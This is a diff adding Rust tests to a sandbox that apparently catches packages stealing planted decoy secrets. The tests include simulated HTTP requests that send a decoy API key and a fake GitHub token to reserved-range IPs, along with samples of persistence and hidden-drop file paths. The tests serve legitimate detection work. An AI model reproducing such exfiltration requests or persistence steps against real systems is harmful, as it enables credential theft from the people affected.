@@ -550,6 +550,36 @@ fn sandbox_enforces_least_privilege() {
     assert!(b.output.contains("WROTE-INSIDE"), "工作目录要能写：{}", b.output);
 }
 
+/// 出站数据里的诱饵和密钥格式。只检查文本，不运行任何程序；IP 用文档保留网段。
+#[test]
+fn sandbox_outbound_secret_scan() {
+    // 偷环境变量里的诱饵 Key：按标记认出来
+    let (leaked, secrets) = sandbox::scan_outbound("POST /c HTTP/1.1\r\n\r\nk=sk-proj-TSUBADECOYOPENAI7f3kQ9xLm2Vb8Nc4Rt6Yw1Zp5Hs0Jd");
+    assert_eq!(leaked, vec!["TSUBADECOYOPENAI"]);
+    assert!(secrets.is_empty(), "诱饵本身不应再算作“别的密钥”：{secrets:?}");
+    // 不是诱饵的真实格式密钥：只记种类
+    let fake_github = format!("ghp_{}", "a1B2".repeat(9));
+    let (leaked, secrets) = sandbox::scan_outbound(&format!("GET http://198.51.100.9/x?t={fake_github} HTTP/1.1"));
+    assert!(leaked.is_empty());
+    assert_eq!(secrets, vec!["GitHub 令牌"]);
+    // 证据里不留密钥的值
+    let shown = sandbox::redact_secrets(&format!("GET http://198.51.100.9/x?t={fake_github}"));
+    assert!(!shown.contains(&fake_github) && shown.contains("[GitHub 令牌 已隐去]"), "{shown}");
+    // 普通请求不误报
+    let (leaked, secrets) = sandbox::scan_outbound("GET http://registry.example.org/pkg/-/pkg-1.0.0.tgz HTTP/1.1\r\nUser-Agent: npm/10\r\n\r\n");
+    assert!(leaked.is_empty() && secrets.is_empty());
+}
+
+/// 诱饵密钥确实放进了沙箱的环境变量（只读一下变量，不发任何请求）。
+#[test]
+fn sandbox_plants_decoy_env_secrets() {
+    if !sandbox_ready() {
+        return;
+    }
+    let b = sandbox::run_script("echo \"$OPENAI_API_KEY $GITHUB_TOKEN\"", "/bin/bash", Duration::from_secs(20)).unwrap();
+    assert!(b.output.contains("TSUBADECOYOPENAI") && b.output.contains("TSUBADECOYGITHUB"), "{}", b.output);
+}
+
 /// 被沙箱拦下的越权写入会从系统日志里收集回来，成为证据。
 #[test]
 fn sandbox_collects_denied_operations() {
@@ -594,13 +624,15 @@ fn sandbox_findings_classify_behavior() {
     // 不运行任何程序，直接给出“观察到的行为”，验证判定逻辑
     let b = Behavior {
         network: vec![
-            NetEvent { target: "203.0.113.7:1224".into(), request: String::new(), leaked: vec!["TSUBA-DECOY-WALLET".into()], forwarded: false },
+            NetEvent { target: "203.0.113.7:1224".into(), request: String::new(), leaked: vec!["TSUBA-DECOY-WALLET".into()], secrets: vec![], forwarded: false },
+            NetEvent { target: "198.51.100.9:80".into(), request: String::new(), leaked: vec![], secrets: vec!["GitHub 令牌".into()], forwarded: false },
         ],
         new_files: vec!["Library/LaunchAgents/com.x.plist".into(), ".node_modules/axios/index.js".into()],
         ..Default::default()
     };
     let msgs = messages(&sandbox::findings(&b));
-    assert!(msgs.contains("诱饵") && msgs.contains("铁证"), "应判定为窃取: {msgs}");
+    assert!(msgs.contains("Exodus 钱包") && msgs.contains("铁证"), "应判定为窃取，并说明是哪种诱饵: {msgs}");
+    assert!(msgs.contains("疑似 GitHub 令牌"), "外发真实格式的密钥应记录: {msgs}");
     assert!(msgs.contains("开机自启"), "应判定为持久化: {msgs}");
     assert!(msgs.contains("隐藏目录"), "应判定为落地痕迹: {msgs}");
     assert!(msgs.contains("IP 地址"), "连裸 IP 应记录: {msgs}");
